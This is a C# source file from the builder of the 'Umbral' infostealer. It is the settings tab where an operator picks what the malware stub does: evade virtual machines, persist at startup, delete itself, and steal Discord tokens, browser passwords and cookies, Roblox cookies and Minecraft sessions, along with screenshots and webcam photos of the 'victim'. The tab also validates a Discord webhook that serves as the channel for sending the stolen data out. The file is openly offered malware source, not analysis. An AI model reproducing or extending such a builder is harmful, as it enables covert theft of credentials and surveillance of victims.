﻿using System;
using System.Drawing;
using System.Net.Http;
using System.Windows.Forms;

namespace Umbral.builder.User_Controls
{
    public partial class GeneralTab : UserControl
    {

        private const string WebhookPlaceholder = "https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz";
        private const string WebhookCheckButtonPlaceHolderEnabled = "Check Webhook";
        private const string WebhookCheckButtonPlaceHolderDisabled = "Checking...";

        public static bool IsWebhookValid;
        public static string Webhook;

        public static bool Ping;
        public static bool AntiVm;
        public static bool Startup;
        public static bool StealTokens;
        public static bool StealPasswords;
        public static bool StealCookies;
        public static bool StealRobloxCookies;
        public static bool StealMinecraftSession;
        public static bool TakeScreenshot;
        public static bool SelfDestruct;
        public static bool CaptureWebcam;

        public GeneralTab()
        {
            InitializeComponent();
            ToolTip tooltip = new ToolTip();
            tooltip.SetToolTip(WebhookCheckButton, "Checks if webhook is working or not.");

            tooltip.SetToolTip(PingCheckBox, "Pings @everyone when sending victim's info.");
            tooltip.SetToolTip(AntiVmCheckBox, "Prevents the stub from running in a virtual machine.");
            tooltip.SetToolTip(StartupCheckBox, "Launches the stub on windows startup.");

            tooltip.SetToolTip(StealTokensCheckBox, "Steals Discord tokens.");
            tooltip.SetToolTip(StealPasswordsCheckBox, "Steals passwords from browsers.");
            tooltip.SetToolTip(StealCookiesCheckBox, "Steals cookies from browsers.");
            tooltip.SetToolTip(StealRobloxCookiesCheckBox, "Steals Roblox cookies.");
            tooltip.SetToolTip(StealMinecraftSessionCheckBox, "Steals Minecraft session file.");
            tooltip.SetToolTip(TakeScreenshotCheckBox, "Takes screenshot of the victim's machine.");
            tooltip.SetToolTip(SelfDestructCheckBox, "Deletes the stub when ran.");
            tooltip.SetToolTip(CaptureWebcamCheckBox, "Captures photos from victim's webcam.");
        }

        private void webhookLabel_Leave(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(webhookLabel.Text))
            {
                webhookLabel.Text = WebhookPlaceholder;
                webhookLabel.ForeColor = Color.Silver;
            }
        }

        private void webhookLabel_Enter(object sender, EventArgs e)
        {
            if (webhookLabel.Text == WebhookPlaceholder)
            {
                webhookLabel.Text = string.Empty;
                webhookLabel.ForeColor = SystemColors.Control;
            }
        }

        private void GeneralTab_Load(object sender, EventArgs e)
        {
            webhookLabel.Text = WebhookPlaceholder;
            webhookLabel.ForeColor = Color.Silver;
        }

        private async void WebhookCheckButton_Click(object sender, EventArgs e)
        {
            if (((Button)sender).Text == WebhookCheckButtonPlaceHolderDisabled)
                return;

            ((Button)sender).Text = WebhookCheckButtonPlaceHolderDisabled;
            if ((webhookLabel.Text.StartsWith("https://") || webhookLabel.Text.StartsWith("http://")) && webhookLabel.Text.Contains("discord") &&
                webhookLabel.Text.Contains("api/webhooks") && !webhookLabel.Text.Contains(" ") && !webhookLabel.Text.Equals(WebhookPlaceholder))
            {
                try
                {
                    using (HttpClient client = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
                    {
                        HttpResponseMessage response = await client.GetAsync(webhookLabel.Text);
                        response.EnsureSuccessStatusCode();
                    }

                    ((Button)sender).Text = WebhookCheckButtonPlaceHolderEnabled;
                    MessageBox.Show("Webhook seems to be working!", "Webhook Status", MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                    IsWebhookValid = true;
                    Webhook = webhookLabel.Text;
                }
                catch
                {
                    ((Button)sender).Text = WebhookCheckButtonPlaceHolderEnabled;
                    MessageBox.Show("Unable to connect to the webhook", "Webhook Status", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                }
            }
            else
            {
                ((Button)sender).Text = WebhookCheckButtonPlaceHolderEnabled;
                MessageBox.Show("Invalid Webhook!", "Webhook Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void CheckBox_CheckChanged(object sender, EventArgs e)
        {
            CheckBox checkBox = (CheckBox)sender;

            if (checkBox.Checked)
            {
                checkBox.ForeColor = Color.Cyan;
            }
            else
            {
                checkBox.ForeColor = Color.White;
            }

            if (checkBox.Equals(PingCheckBox))
                Ping = checkBox.Checked;
            else if (checkBox.Equals(StartupCheckBox))
                Startup = checkBox.Checked;
            else if (checkBox.Equals(AntiVmCheckBox))
                AntiVm = checkBox.Checked;
            else if (checkBox.Equals(StealTokensCheckBox))
                StealTokens = checkBox.Checked;
            else if (checkBox.Equals(StealPasswordsCheckBox))
                StealPasswords = checkBox.Checked;
            else if (checkBox.Equals(StealCookiesCheckBox))
                StealCookies = checkBox.Checked;
            else if (checkBox.Equals(StealRobloxCookiesCheckBox))
                StealRobloxCookies = checkBox.Checked;
            else if (checkBox.Equals(StealMinecraftSessionCheckBox))
                StealMinecraftSession = checkBox.Checked;
            else if (checkBox.Equals(TakeScreenshotCheckBox))
                TakeScreenshot = checkBox.Checked;
            else if (checkBox.Equals(SelfDestructCheckBox))
                SelfDestruct = checkBox.Checked;
            else if (checkBox.Equals(CaptureWebcamCheckBox))
                CaptureWebcam = checkBox.Checked;
        }

        private void webhookLabel_TextChanged(object sender, EventArgs e)
        {
            IsWebhookValid = false;
        }
    }
}